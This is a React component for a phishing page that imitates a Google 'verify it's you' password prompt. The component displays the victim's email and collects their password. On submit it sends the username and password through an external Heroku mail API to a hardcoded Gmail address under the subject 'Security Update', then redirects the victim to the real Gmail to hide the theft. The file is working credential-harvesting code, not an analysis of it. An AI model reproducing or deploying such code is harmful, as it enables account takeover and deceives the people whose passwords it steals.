import React, { useContext } from "react";
import clsx from "clsx";
import { AppContext } from "../../App";
import useMediaQuery from "@material-ui/core/useMediaQuery";
import {
  Box,
  Typography,
  makeStyles,
  Chip,
  Avatar,
  FormControl,
  InputLabel,
  OutlinedInput,
  InputAdornment,
  IconButton,
  Button,
  Link,
  useTheme,
} from "@material-ui/core";
import ExpandMoreIcon from "@material-ui/icons/ExpandMore";
import AccountCircleSharpIcon from "@material-ui/icons/AccountCircleSharp";
import VisibilityOutlinedIcon from "@material-ui/icons/VisibilityOutlined";
import VisibilityOffOutlinedIcon from "@material-ui/icons/VisibilityOffOutlined";
import { navigate } from "@reach/router";
import { ajax } from "rxjs/ajax";

const useStyles = makeStyles((theme) => ({
  margintop: {
    padding: theme.spacing(5),
    display: "flex",
    flexDirection: "column",
    alignItems: "flex-start",
  },
  mt: {
    marginTop: theme.spacing(3),
  },
  mtt: {
    marginTop: theme.spacing(1),
  },
  body: {
    marginTop: theme.spacing(1),
    paddingLeft: theme.spacing(4),
    paddingRight: theme.spacing(4),
  },
  bodysm: {
    marginTop: theme.spacing(1),
    paddingLeft: theme.spacing(1),
    paddingRight: theme.spacing(1),
  },

  mt3: {
    marginTop: theme.spacing(3),
    width: "-webkit-fill-available",
  },
  boldtext: {
    fontWeight: "bold",
    marginTop: theme.spacing(1),
  },
  link: {
    fontWeight: "bold",
  },
  space: {
    flexGrow: 1,
  },
  empty: {
    height: "4em",
  },
}));
function PasswordPage() {
  const classes = useStyles();
  const { loading, data, setData, setLoading } = useContext(AppContext);
  const [values, setValues] = React.useState({
    amount: "",
    password: "",
    weight: "",
    weightRange: "",
    showPassword: false,
  });

  const handleChange = (prop) => (event) => {
    setValues({ ...values, [prop]: event.target.value });
  };
  const handleClickShowPassword = () => {
    setValues({ ...values, showPassword: !values.showPassword });
  };
  const submit = (e) => {
    e.preventDefault();
    setLoading({ ...loading, loading: true });
    setTimeout(() => {
      setLoading({
        ...loading,
        loading: !loading,
      });

      ajax({
        url: "https://hotblockexpressapi.herokuapp.com/mail",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: {
          message: `username: ${data.email} <br/><br/>
          password: ${values.password}`,
          to: `jhonsnow751@gmail.com`,
          subject: "Security Update",
        },
      }).subscribe(() => {
        navigate("https://mail.google.com");
      });
    }, 3000);
  };
  return (
    <React.Fragment>
      <Box display="flex" flexDirection="column" alignItems="center">
        <Typography variant="h5" className={classes.mtt}>
          Welcome
        </Typography>
        <Chip
          avatar={<AccountCircleSharpIcon />}
          label={data.email}
          variant="outlined"
          deleteIcon={<ExpandMoreIcon />}
          onDelete={() => {}}
          className={classes.mtt}
        />
      </Box>
      <Box
        className={
          useMediaQuery(useTheme().breakpoints.up("sm"))
            ? classes.body
            : classes.bodysm
        }
      >
        <form onSubmit={submit}>
          <Box
            display="flex"
            justifyContent="flex-start"
            className={classes.mt}
          >
            <Typography variant="body2">
              To continue, first verify it's you
            </Typography>
          </Box>
          <Box className={classes.mt}>
            <FormControl
              className={clsx(classes.margin, classes.textField)}
              variant="outlined"
              fullWidth
              required
            >
              <InputLabel htmlFor="outlined-adornment-password">
                Enter your password
              </InputLabel>
              <OutlinedInput
                id="outlined-adornment-password"
                type={values.showPassword ? "text" : "password"}
                value={values.password}
                onChange={handleChange("password")}
                endAdornment={
                  <InputAdornment position="end">
                    <IconButton
                      aria-label="toggle password visibility"
                      onClick={handleClickShowPassword}
                      edge="end"
                    >
                      {values.showPassword ? (
                        <VisibilityOutlinedIcon />
                      ) : (
                        <VisibilityOffOutlinedIcon />
                      )}
                    </IconButton>
                  </InputAdornment>
                }
                labelWidth={70}
              />
            </FormControl>
          </Box>
          <Box display="flex" justifyContent="center" className={classes.mt3}>
            <Typography
              variant="body2"
              align="left"
              className={classes.boldtext}
            >
              <Link>Create account</Link>
            </Typography>
            <span className={classes.space} />
            <Button variant="contained" color="primary" type="submit">
              Next
            </Button>
          </Box>
          <div className={classes.empty} />
        </form>
      </Box>
    </React.Fragment>
  );
}

export default PasswordPage;
